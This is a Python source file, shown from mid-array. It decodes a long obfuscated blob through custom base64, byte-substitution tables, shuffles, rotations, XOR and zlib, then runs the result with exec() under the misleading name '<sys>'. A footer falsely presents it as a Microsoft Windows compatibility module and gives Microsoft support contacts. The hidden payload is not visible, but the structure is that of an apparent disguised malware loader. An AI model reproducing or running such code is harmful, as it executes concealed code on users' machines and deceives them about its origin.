87, 96, 180, 24, 71, 72, 189, 20, 61, 34, 44, 171]
_isb2 = [67, 155, 163, 22, 106, 99, 80, 206, 96, 142, 104, 108, 195, 35, 84, 173, 168, 183, 47, 194, 251, 132, 113, 124, 247, 156, 58, 147, 159, 198, 38, 199, 170, 55, 253, 62, 34, 223, 112, 174, 0, 72, 129, 51, 254, 87, 102, 21, 153, 24, 82, 171, 211, 222, 157, 50, 227, 218, 212, 79, 219, 252, 119, 42, 95, 151, 235, 94, 30, 74, 241, 248, 249, 179, 187, 146, 130, 10, 141, 25, 78, 166, 76, 225, 205, 29, 100, 244, 56, 5, 97, 135, 228, 178, 1, 177, 245, 12, 144, 73, 128, 181, 103, 213, 185, 216, 19, 214, 117, 91, 210, 83, 180, 66, 92, 169, 230, 2, 204, 8, 197, 167, 114, 16, 161, 188, 53, 126, 122, 32, 165, 158, 36, 44, 107, 75, 175, 111, 40, 48, 93, 160, 138, 209, 150, 116, 59, 85, 61, 238, 86, 162, 13, 207, 18, 221, 148, 105, 140, 52, 231, 193, 191, 60, 236, 71, 136, 81, 63, 164, 133, 255, 120, 6, 3, 68, 234, 70, 121, 31, 246, 14, 118, 69, 41, 28, 145, 77, 64, 250, 182, 37, 203, 215, 4, 172, 237, 224, 88, 54, 90, 196, 239, 134, 226, 27, 190, 200, 208, 152, 57, 11, 9, 98, 125, 137, 20, 123, 26, 139, 7, 110, 109, 49, 39, 149, 240, 229, 184, 192, 233, 143, 232, 217, 243, 176, 154, 15, 46, 101, 115, 202, 17, 242, 201, 220, 189, 89, 43, 23, 65, 33, 45, 186, 127, 131]
_sb3 = [99, 210, 243, 82, 61, 133, 194, 100, 130, 218, 148, 140, 157, 241, 58, 220, 250, 207, 52, 129, 103, 113, 1, 226, 255, 16, 80, 163, 22, 6, 199, 229, 72, 185, 212, 245, 76, 225, 242, 13, 105, 84, 254, 2, 117, 204, 131, 17, 216, 65, 118, 33, 94, 132, 166, 227, 228, 249, 196, 200, 38, 150, 115, 209, 136, 159, 69, 252, 141, 47, 95, 174, 222, 31, 198, 189, 160, 240, 109, 126, 181, 106, 28, 147, 248, 50, 20, 235, 211, 48, 5, 42, 86, 89, 83, 233, 77, 30, 73, 43, 137, 172, 21, 79, 75, 173, 67, 9, 161, 149, 98, 11, 179, 224, 26, 110, 104, 101, 180, 246, 62, 18, 60, 44, 85, 70, 183, 178, 63, 111, 230, 184, 205, 236, 97, 24, 57, 231, 36, 59, 8, 162, 188, 41, 192, 247, 143, 214, 203, 169, 208, 123, 182, 155, 81, 213, 96, 78, 215, 239, 251, 56, 0, 142, 68, 193, 3, 15, 190, 127, 244, 176, 138, 27, 146, 55, 186, 74, 202, 153, 90, 14, 154, 128, 29, 35, 168, 19, 217, 121, 134, 39, 191, 54, 187, 145, 144, 197, 221, 108, 253, 219, 7, 238, 25, 66, 158, 93, 165, 171, 206, 102, 119, 114, 151, 195, 92, 32, 125, 91, 177, 51, 12, 234, 53, 170, 175, 152, 167, 232, 201, 71, 107, 237, 124, 116, 23, 10, 46, 139, 34, 87, 40, 223, 4, 112, 120, 37, 45, 135, 88, 164, 49, 122, 64, 156]
_isb3 = [162, 22, 43, 166, 244, 90, 29, 202, 140, 107, 237, 111, 222, 39, 181, 167, 25, 47, 121, 187, 86, 102, 28, 236, 135, 204, 114, 173, 82, 184, 97, 73, 217, 51, 240, 185, 138, 247, 60, 191, 242, 143, 91, 99, 123, 248, 238, 69, 89, 252, 85, 221, 18, 224, 193, 175, 161, 136, 14, 139, 122, 4, 120, 128, 254, 49, 205, 106, 164, 66, 125, 231, 32, 98, 177, 104, 36, 96, 157, 103, 26, 154, 3, 94, 41, 124, 92, 241, 250, 93, 180, 219, 216, 207, 52, 70, 156, 134, 110, 0, 7, 117, 211, 20, 116, 40, 81, 232, 199, 78, 115, 129, 245, 21, 213, 62, 235, 44, 50, 212, 246, 189, 253, 151, 234, 218, 79, 169, 183, 19, 8, 46, 53, 5, 190, 249, 64, 100, 172, 239, 11, 68, 163, 146, 196, 195, 174, 83, 10, 109, 61, 214, 227, 179, 182, 153, 255, 12, 206, 65, 76, 108, 141, 27, 251, 208, 54, 228, 186, 149, 225, 209, 101, 105, 71, 226, 171, 220, 127, 112, 118, 80, 152, 126, 131, 33, 176, 194, 142, 75, 168, 192, 144, 165, 6, 215, 58, 197, 74, 30, 59, 230, 178, 148, 45, 132, 210, 17, 150, 63, 1, 88, 34, 155, 147, 158, 48, 188, 9, 201, 15, 198, 72, 243, 113, 37, 23, 55, 56, 31, 130, 137, 229, 95, 223, 87, 133, 233, 203, 159, 77, 13, 38, 2, 170, 35, 119, 145, 84, 57, 16, 160, 67, 200, 42, 24]
_seed = 3262802142
_P = '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'

_ALPHA = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

def _x(d, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(d))

def _rot_inv(d, n):
    n = n % 8
    if n == 0: return bytes(d)
    return bytes(((b >> n) | (b << (8 - n))) & 0xFF for b in d)

def _unshuffle(d, seed):
    r = _rnd.Random(seed)
    idx = list(range(len(d)))
    r.shuffle(idx)
    out = bytearray(len(d))
    for i, pos in enumerate(idx):
        out[i] = d[pos]
    return bytes(out)

def _b64_decode_custom(s):
    rnd = _rnd.Random(_seed ^ 0xDEADBEEF ^ 0xCAFEBABE ^ 0xFEEDFACE)
    perm = list(range(64))
    rnd.shuffle(perm)
    custom = bytes(_ALPHA[p] for p in perm)
    rev = bytes.maketrans(custom, _ALPHA)
    return base64.b64decode(s.encode().translate(rev))

def _final_decode():
    raw = _b64_decode_custom(_P)
    raw = _rot_inv(raw, 5)
    for i in range(len(_lk) - 1, -1, -1):
        if i % 7 == 0:
            sbox3 = _sb3 if i % 2 == 0 else _isb3
            inv3 = [0] * 256
            for a, b in enumerate(sbox3):
                inv3[b] = a
            raw = bytes(inv3[b] for b in raw)
        if i % 5 == 0:
            sbox2 = _sb2 if i % 2 == 0 else _isb2
            inv2 = [0] * 256
            for a, b in enumerate(sbox2):
                inv2[b] = a
            raw = bytes(inv2[b] for b in raw)
        if i % 3 == 0:
            raw = _unshuffle(raw, _seed + i)
        sbox = _sb if i % 2 == 0 else _isb
        inv = [0] * 256
        for a, b in enumerate(sbox):
            inv[b] = a
        raw = bytes(inv[b] for b in raw)
        rot_n = (i % 7) + 1
        raw = _rot_inv(raw, rot_n)
        raw = _x(raw, _lk[i])
    raw = _x(raw, _m)
    raw = _rot_inv(raw, 7)
    inv_sb = [0] * 256
    for a, b in enumerate(_sb):
        inv_sb[b] = a
    raw = bytes(inv_sb[b] for b in raw)
    return zlib.decompress(raw)

def _r():
    try:
        p = _final_decode()
        _g = {"__name__": "__main__", "__builtins__": __builtins__}
        exec(compile(p, "<sys>", "exec"), _g)
    except Exception as e:
        try:
            if sys.stderr is not None:
                sys.stderr.write("HATA: " + str(e) + "\n")
        except Exception:
            pass

if __name__ == "__main__":
    _r()


# ---------------------------------------------------------------------------
# Microsoft Windows Compatibility Layer
# End of module wci_compat
#
# This module is distributed under the terms of the MIT License.
# See the LICENSE file for details.
#
# For support, contact: support@microsoft.com
# For documentation, visit: https://docs.microsoft.com/windows/compat
# ---------------------------------------------------------------------------
